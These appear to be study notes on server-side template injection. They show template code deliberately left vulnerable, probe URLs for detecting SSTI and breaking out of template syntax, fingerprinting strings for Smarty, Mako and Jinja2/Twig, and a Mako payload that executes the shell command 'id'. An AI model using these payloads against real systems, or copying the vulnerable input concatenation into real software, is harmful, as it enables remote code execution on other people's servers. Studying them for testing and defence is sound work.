## Plaintext context

(Freemarker)
```bash

# vulnerable SSTI code
render('Hello ' + username)

# URL
http://vulnerable-website.com/?username=${7*7}

# output
Hello 49
```

## Code Context

```bash
#code
greeting = getQueryParameter('greeting') engine.render("Hello {{"+greeting+"}}", data)

# test if parameter does not contain a direct XSS vuln
http://vulnerable-website.com/?greeting=data.username<tag>

# break out of syntax
http://vulnerable-website.com/?greeting=data.username}}<tag>

#result
Hello Carlos<tag>

```

### Template engines
![](../SCREENSHOTS/Pasted%20image%2020221231100502.png)

1. smarty
```
a{*comment*}b	
```
2. Mako
```python
${"z".join("ab")}

# RCE for python based Mako
<%
	import os
	x=os.popen('id').read()
	%>
	${x}
```
3. Jinja2 or Twig
```
{{7*7}}	
```


# 